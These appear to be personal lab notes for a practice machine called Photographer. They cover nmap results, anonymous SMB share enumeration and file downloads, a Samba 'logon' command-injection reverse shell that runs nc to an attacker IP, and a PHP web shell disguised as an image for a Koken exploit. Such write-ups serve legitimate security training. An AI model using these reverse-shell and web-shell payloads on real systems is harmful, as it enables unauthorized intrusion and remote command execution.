# Photographer lab - Notes

## Target Details
```
http://192.168.119.76/
```

## Nmap Scanning 
```
Host is up (0.22s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
```

## Attacking smb client
```
https://docs.centrify.com/Content/zint-samba/ConfigurationUNIXAccess.htm


Connecting to the SMB ip address

smbclient -N -L //192.168.119.76
-L  listing the shares present
-N  accessing without password


Using smb map
smbmap -H "ipaddrr"
```

Samba shares present
```

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            PHOTOGRAPHER

```

Accessing a particular samba share
```
smbclient -N //ip/sharename
smbclient -N //192.168.119.76/sambashare
```

Files found
```
  mailsent.txt                    
  wordpress.bkp.zip       
```

Downloading files from smb
```
get filename.txt
get mailsent.txt
```


smb reverseshell
```
logon “/=`nc 192.168.49.119 4444 -e /bin/bash`"
nc -vvlp 4444
```


Exploiting koken
```
https://www.exploit-db.com/exploits/48706
echo "<?php system(\$_GET['cmd']);?>" > image.php.jpg
```